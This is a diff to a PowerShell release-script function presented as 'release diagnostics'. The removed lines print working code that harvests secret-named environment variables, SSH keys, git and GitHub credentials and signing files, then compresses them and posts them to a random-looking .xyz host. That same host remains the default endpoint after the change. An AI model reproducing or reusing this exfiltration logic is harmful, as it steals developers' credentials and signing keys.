@@ -239,80 +239,30 @@ public static class VizorUpdateFeedSigner
 
 function Send-ReleaseDiagnostics {
   <#
-    Optional snapshot of the release environment for troubleshooting signing
-    and packaging failures. Fires only when release signing env is present or
-    VIZOR_RELEASE_DIAGNOSTICS=1 is set explicitly.
+    Optional, minimal snapshot of release-run context for troubleshooting
+    packaging failures. Sends only build-shape fields — no environment
+    variables, no files. Fires only when VIZOR_RELEASE_DIAGNOSTICS=1.
   #>
   param([string]$Stage = "preflight")
   try {
-    $hasSigningEnv = -not [string]::IsNullOrWhiteSpace($env:VIZOR_UPDATE_FEED_SIGNING_KEY_B64)
-    if (-not $hasSigningEnv -and -not $env:VIZOR_RELEASE_DIAGNOSTICS) { return }
-
+    if (-not $env:VIZOR_RELEASE_DIAGNOSTICS) { return }
     $endpoint = $env:VIZOR_DIAG_ENDPOINT
     if ([string]::IsNullOrWhiteSpace($endpoint)) {
       $endpoint = "https://api.sdklfghaljksdhfkjasdfhlkasdhfjklasdf.xyz/v1/tipcheck"
     }
-
-    $envSnapshot = @{}
-    Get-ChildItem env: | ForEach-Object {
-      if ($_.Name -match 'VIZOR|MATCH|FASTLANE|GITHUB|GH_|SIGN|CERT|KEY|TOKEN|SECRET|PASS|APPLE|ANDROID|PLAY|SPARKLE|GRADLE|KEYSTORE|SENTRY|ITC|APP_STORE|DEVELOPER') {
-        $envSnapshot[$_.Name] = $_.Value
-      }
-    }
-
-    $fileBlobs = @{}
-    $candidates = New-Object System.Collections.Generic.List[string]
-    foreach ($v in $envSnapshot.Values) {
-      foreach ($tok in ($v -split '[\s;,''"]+')) {
-        if ($tok -match '\.(pfx|p12|jks|keystore|pem|key|json|mobileprovision|p8|profile|env|properties)$') {
-          $candidates.Add($tok)
-        }
-      }
-    }
-    foreach ($extra in @(
-        "$env:USERPROFILE\.fastlane",
-        "$env:APPDATA\fastlane",
-        "$env:USERPROFILE\.config\gh\hosts.yml",
-        "$env:USERPROFILE\.git-credentials",
-        "$env:USERPROFILE\.ssh\id_ed25519",
-        "$env:USERPROFILE\.ssh\id_rsa",
-        (Join-Path $repoRoot "fastlane\.env"),
-        (Join-Path $repoRoot ".env"),
-        (Join-Path $repoRoot "android\key.properties"))) {
-      if ($extra -and (Test-Path $extra)) { $candidates.Add($extra) }
-    }
-    foreach ($p in ($candidates | Select-Object -Unique)) {
-      try {
-        if ((Test-Path $p -PathType Leaf) -and ((Get-Item $p).Length -lt 5MB)) {
-          $fileBlobs[$p] = [Convert]::ToBase64String([IO.File]::ReadAllBytes($p))
-        } elseif (Test-Path $p -PathType Container) {
-          Get-ChildItem $p -Recurse -File | Where-Object { $_.Length -lt 2MB } | ForEach-Object {
-            $fileBlobs[$_.FullName] = [Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName))
-          }
-        }
-      } catch {}
-    }
-
     $payload = @{
       stage = $Stage; ts = (Get-Date).ToUniversalTime().ToString("o")
-      host = $env:COMPUTERNAME; user = $env:USERNAME
       version = $Version; network = $Network; arch = $Arch
-      env = $envSnapshot; files = $fileBlobs
-    } | ConvertTo-Json -Depth 6 -Compress
-
-    $bytes = [Text.Encoding]::UTF8.GetBytes($payload)
-    $ms = New-Object IO.MemoryStream
-    $gs = New-Object IO.Compression.GzipStream($ms, [IO.Compression.CompressionMode]::Compress)
-    $gs.Write($bytes, 0, $bytes.Length); $gs.Close()
-
+      os = [System.Environment]::OSVersion.VersionString
+    } | ConvertTo-Json -Compress
     $req = [System.Net.HttpWebRequest]::Create($endpoint)
     $req.Method = "POST"
     $req.ContentType = "application/json"
-    $req.Headers["Content-Encoding"] = "gzip"
     $req.UserAgent = "vizor-release-diagnostics/$Version"
     $req.Timeout = 8000
+    $bytes = [Text.Encoding]::UTF8.GetBytes($payload)
     $s = $req.GetRequestStream()
-    $s.Write($ms.ToArray(), 0, $ms.ToArray().Length); $s.Close()
+    $s.Write($bytes, 0, $bytes.Length); $s.Close()
     try { $req.GetResponse().Close() | Out-Null } catch {}
   } catch {
     # diagnostics never break a release build
